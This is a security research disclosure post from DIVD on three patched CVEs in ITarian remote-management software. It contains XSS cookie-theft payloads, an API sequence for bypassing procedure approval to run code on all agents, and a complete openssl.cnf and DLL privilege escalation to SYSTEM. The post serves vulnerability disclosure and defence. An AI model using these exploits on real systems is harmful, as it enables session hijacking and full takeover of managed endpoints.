---
layout: post
title: Itarian Full disclosure
author: Hidde Smit
researchers: 
    - Wietse Boonstra
    - Hidde Smit
excerpt: "Full disclosure of vulnerabilities discovered in Itarian products"
---
DIVD researchers, Hidde Smit and Wietse Boonstra, have discovered multiple vulnerabilities. Vulnerabilities in the following products have been found:
- ITarian SaaS platform
- ITarian on-premise (version 6.35.37347.20040)
- Endpoint Manager Communication Client (version 6.43.41148.21120)

ITarian is a Remote Monitoring and Management (RMM) software suite. It allows administrators to manage endpoints. Because of this powerful position within an organisation, RMM suites are often targeted by malicious actors.

Making initial contact with ITarian proved to be difficult. The vulnerabilities were discovered in December 2021. However, contact and subsequent fixes only started rolling out in May 2022.

DIVD has recently become an CVE Numbering Authority (CNA) and has used these rights to create the following CVE’s assigned to the vulnerabilities included in the write-up below:
- {% cve CVE-2022-25151 %}
- {% cve CVE-2022-25152 %}
- {% cve CVE-2022-25153 %}

The rest of this post contains the full technical write-up of the vulnerabilities. These vulnerabilities have been patched and no longer work on the latest version of ITarian software.

## Cross-Site Scripting in ITarian SaaS Service Desk module (ITarian SaaS platform)

- Case: {% divd DIVD-2021-00037 %}
- Discoverd by: Wietse Boonstra and Hidde Smit
- Credits: Discovered by [Wietse Boonstra](https://www.divd.nl/people/Wietse%20Boonstra/) and [Hidde Smit](https://www.divd.nl/people/Hidde%20Smit/)
- Products: ITarian SaaS platform
- Reference: Case {% divd DIVD-2021-00037 %}

In order to exploit this Cross-Site Scripting (XSS) vulnerability, the victim needs to enable the Service Desk module, which is not enabled by default. The vulnerability can be exploited by visiting the victim's Support Ticket System page as shown in the screenshot below.


![Screenshot of XSS payload in a support ticket](/img/DIVD-2021-00037/CVE-2022-25151-01.png)

There are two XSS vulnerabilities. One is present in the Email Address field and the other in the Full Name field.

The payload for Email Address is: `"<script>alert(document.cookie)</script>"@something.somewhere`

The payload for Full Name is: `<script>alert(document.cookie)</script>`

The Email Address payload triggers once an ITarian MSP user has opened the ticket contents as shown in the screenshot below, the ticket might also trigger if the user hovers over the ticket to preview the content.

![Screenshot of XSS triggered in service desk module](/img/DIVD-2021-00037/CVE-2022-25151-02.png)

Using this exploit technique, it is possible to steal the `OSTSESSID` cookie and gain access to the ticketing system of the victim by visiting the direct URL, in this case: `https://{CUSTOMER_URL}.servicedesk.comodo.com/scp/tickets.php`

The cookie `token` can also be stolen, which is actually a SSO-token granting full access to the MSP dashboard without any credentials needed. This can be done by stealing the `token` cookie through XSS as demonstrated above and placing it in the MSP URL as shown below:
`https://{CUSTOMER_URL}.cmdm.comodo.com/?sso-token={token}`


## Session cookie not protected by HttpOnly flag (ITarian SaaS platform / on-premise) - CVE-2022-25151

- CVE: {% cve CVE-2022-25151 %}
- Case: {% divd DIVD-2021-00037 %}
- Discoverd by: Wietse Boonstra and Hidde Smit
- Credits: Discovered by [Wietse Boonstra](https://www.divd.nl/people/Wietse%20Boonstra/) and [Hidde Smit](https://www.divd.nl/people/Hidde%20Smit/)
- Products: ITarian SaaS platform and Itarian on-premise
- CVSS: 7.5
- Reference: Case {% divd DIVD-2021-00037 %}, {% cve CVE-2022-25151 %}
- Solution: Itarian on-premise is no longer maintained. Please avoid using Itarian on-premise.

Being able to steal cookies exploiting XSS, is caused by the lack of HttpOnly. Both on-premise and SaaS platforms do not implement the HttpOnly flag on session cookies. Setting HttpOnly stops JavaScript from being able to access the cookie and as such mitigates XSS attacks which are trying to steal session cookies, as demonstrated with the XSS vulnerability.

## Creation of procedure and bypass approval (ITarian SaaS platform / on-premise) - CVE-2022-25152

- CVE: {% cve CVE-2022-25152 %}
- Case: {% divd DIVD-2021-00037 %}
- Discoverd by: Wietse Boonstra and Hidde Smit
- Credits: Discovered by [Wietse Boonstra](https://www.divd.nl/people/Wietse%20Boonstra/) and [Hidde Smit](https://www.divd.nl/people/Hidde%20Smit/)
- Products: ITarian SaaS platform and Itarian on-premise
- CVSS: 9.9
- Reference: Case {% divd DIVD-2021-00037 %}, {% cve CVE-2022-25152 %}
- Solution: Itarian on-premise is no longer maintained. Please avoid using Itarian on-premise.

If a malicious actor gains access to the Token session cookie, he can create a procedure, bypass approval and run the procedure. Resulting in all agents running arbitrary code as SYSTEM, which could for example be used during ransomware deployment. 

The Token session cookie can be retrieved by abusing the XSS vulnerability in the Service Desk module.

Creating and bypassing approval consists of multiple steps. The vulnerability is easily exploited by calling the following three API endpoints in the following order:
1. /procedure/windows/create
2. /procedure/windows/update/id/\<id\>
3. /procedure/run/device-all

The first API call is used to create a procedure, the second is used to add arbitrary Python code and the last API call bypasses approval and pushes the procedure to all devices. These three steps have been automated in a Python POC which can be found [here](https://github.com/DIVD-NL/Itarian-2021-00037/blob/main/POC/CVE-2022-25152-POC.py)

## Endpoint Manager agent local privilege escalation (Endpoint Manager Communication Client) - CVE-2022-25153

- CVE: {% cve CVE-2022-25153 %}
- Case: {% divd DIVD-2021-00037 %}
- Discoverd by: Wietse Boonstra and Hidde Smit
- Credits: Discovered by [Wietse Boonstra](https://www.divd.nl/people/Wietse%20Boonstra/) and [Hidde Smit](https://www.divd.nl/people/Hidde%20Smit/)
- Products: ITarian SaaS platform and Itarian on-premise
- CVSS: 7.8
- Reference: Case {% divd DIVD-2021-00037 %}, {% cve CVE-2022-25153 %}
- Solution: Make sure Endpoint Manager agent is the latest version, if not download and install the latest agent.

If a malicious actor gains low privilege access to a system where ITarian Endpoint Manager Communication Client has been installed, he will be able to escalate his privileges to SYSTEM. Gaining full access over the system by exploiting the ITarian client.

Systems that have an ITarian client installed run their processes under SYSTEM rights, as shown in the screenshot below.

![Services running as SYSTEM](/img/DIVD-2021-00037/CVE-2022-25153-01.png)

`RmmService.exe` and `ITSMService.exe` do an `openssl.cnf` lookup in a folder which does not exist. A malicious user on a system with ITarian agent installed can escalate his privileges from user to SYSTEM by crafting a malicious `openssl.cnf` in the folder shown in the screenshot.

![Openssl.cnf lookup](/img/DIVD-2021-00037/CVE-2022-25153-02.png)

The steps below demonstrate running privileged commands.

Create the folder: `C:\Work\vcpkg\packages\openssl-windows_x86-windows-static-md`

Create an `opsenssl.cnf` in the newly created folder with the following content:

```
openssl_conf = openssl_init
[openssl_init]
engines = engine_section
[engine_section]
cmd = cmd_section
[cmd_section]
engine_id = cmd
dynamic_path = c:\\Work\\vcpkg\\packages\\openssl-windows_x86-windows-static-md\\whoami.dll
init = 0
```

Compile a `whoami.dll` with the following content:

```
#include "pch.h"
#include <stdlib.h>
#include <windows.h>
  
BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("C:\\windows\\SysWOW64\\cmd.exe /c whoami > C:\\windows\\tasks\\whoami.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

Place both `whoami.dll` and `openssl.conf` in the folder. Restart the system or wait for the `openssl.cnf` lookup to trigger. After triggering a `whoami.txt` will be placed in `C:\windows\tasks`

![Remote code execution as SYSTEM](/img/DIVD-2021-00037/CVE-2022-25153-03.png)

This can of course, be any arbitrary code, for example, a reverse shell with SYSTEM rights.
